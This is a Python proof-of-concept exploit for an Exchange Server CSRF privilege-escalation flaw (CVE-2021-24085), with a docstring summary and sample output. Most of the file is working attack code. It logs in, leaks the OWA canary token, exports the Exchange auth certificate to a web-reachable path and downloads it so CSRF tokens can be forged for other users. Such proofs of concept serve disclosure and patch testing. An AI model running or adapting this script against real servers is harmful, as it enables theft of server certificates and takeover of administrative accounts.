#!/usr/bin/env python3
"""
Microsoft Exchange Server msExchEcpCanary Cross Site Request Forgery Elevation of Privilege Vulnerability
CVE: CVE-2021-24085

# Summary

This vulnerability allows remote attackers escalate privileges on affected installations of Microsoft Exchange Server. Authentication and user interaction is required to exploit this vulnerability in that the target must visit a malicious page.

The specific flaw exists within the HasValidCanary function inside of the Canary15 class. The issue results in an insecure generation of cross site request forgery tokens that can be used to install an office-addins. An attacker can leverage this vulnerability to escalate privileges to an administrative account. 

## Example:

```
researcher@srcincite:~$ ./poc.py
(+) usage: ./poc.py <target> <user:pass>
(+) eg: ./poc.py 192.168.75.142 harryh@exchangedemo.com:user123###

researcher@srcincite:~$ ./poc.py 192.168.75.142 harryh@exchangedemo.com:user123###
(+) found the thumbprint: F4EB6AADB8D7C0D12E756BA2E28F90CCACD41299
(+) exported the cert to the target filesystem
(+) saved the cert to testcert.der using password: hax
```

Now you can generate csrf tokens with YellowCanary using a target users SID:

```
c:\Users\researcher>poc.exe S-1-5-21-257332918-392067043-4020791575-3104 testcert.der hax

            #====================================================
            # YellowCanary - generate msExchEcpCanary csrf tokens
            #====================================================

security identifier : S-1-5-21-257332918-392067043-4020791575-3104
msExchEcpCanary     : sA0o0nS_C0G_PMdcA_dAd5BdAEL_-NcYhndaAwlhBJFs4a4iKy4sn53azH-O5Ix3F0jnwzZZUsk.
```
  
# Credit

Steven Seeley of Qihoo 360 Vulcan Team
"""

import re
import sys
import urllib3
import requests
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_params(s, schema):
    return {
        "schema": schema,
        "msExchEcpCanary": s.cookies.get(name='X-OWA-CANARY')
    }

def write_cert(t, s, thumbprint, export_pwd):
    p = get_params(s, "ExportCertificate")
    d = {
        "identity":{
            "__type":"Identity:ECP",
            "DisplayName":"",
            "RawIdentity": thumbprint
        },
        "properties":{
            "Parameters":{
                "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "FileName": "C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\ecp\\poc.png",
                "PlainPassword": export_pwd
            }
        }
    }
    r = s.post("https://%s/ecp/DDI/DDIService.svc/SetObject" % t, params=p, json=d, verify=False)
    try:
        e = r.json()["d"]["ErrorRecords"]
    except:
        raise ValueError('(-) couldnt parse json, probably not vulnerable!')
    assert len(e) == 0, "(-) failed! check your RBAC, you need 'Server Management'"

def download_cert(t, s):
    r = s.get("https://%s/ecp/poc.png" % t, verify=False)
    with open("testcert.der", "wb") as cert:
        cert.write(r.content)

def find_thumbprint(t, s):
    p = get_params(s, "CertificateServices")
    d = {
        "filter":{
            "Parameters":{
                "__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "SelectedView":"*"
            }
        },
        "sort":{}
    }
    r = s.post("https://%s/ecp/DDI/DDIService.svc/GetList" % t, params=p, json=d, verify=False)
    try:
        output = r.json()["d"]["Output"]
    except:
        raise ValueError('(-) couldnt parse json, probably not vulnerable!')
    assert len(output) != 0, "(-) failed! check your RBAC, you may need the 'Exchange Server Certificates' role"
    for cert in output:
        if cert["Name"] == "Microsoft Exchange Server Auth Certificate":
            return cert["Thumbprint"]
    
def main(t, usr, pwd):
    # change this if you want
    export_pwd = "hax"
    s = requests.Session()
    d = {
        "destination" : "https://%s/owa" % t,
        "flags" : "",
        "username" : usr,
        "password" : pwd
    }
    s.post("https://%s/owa/auth.owa" % t, data=d, verify=False)
    assert s.cookies.get(name='X-OWA-CANARY') != None, "(-) couldn't leak the csrf canary!"
    thumbprint = find_thumbprint(t, s)
    print("(+) found the thumbprint: %s" % thumbprint)
    write_cert(t, s, thumbprint, export_pwd)
    print("(+) exported the cert to the target filesystem")
    download_cert(t, s)
    print("(+) saved the cert to testcert.der using password: %s" % export_pwd)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("(+) usage: %s <target> <user:pass> <thumbprint>" % sys.argv[0])
        print("(+) eg: %s 192.168.75.142 harry@exchangedemo.com:user123###" % sys.argv[0])
        sys.exit(-1)
    trgt = sys.argv[1]
    assert ":" in sys.argv[2], "(-) you need a user and password!"
    usr = sys.argv[2].split(":")[0]
    pwd = sys.argv[2].split(":")[1]
    main(trgt, usr, pwd)
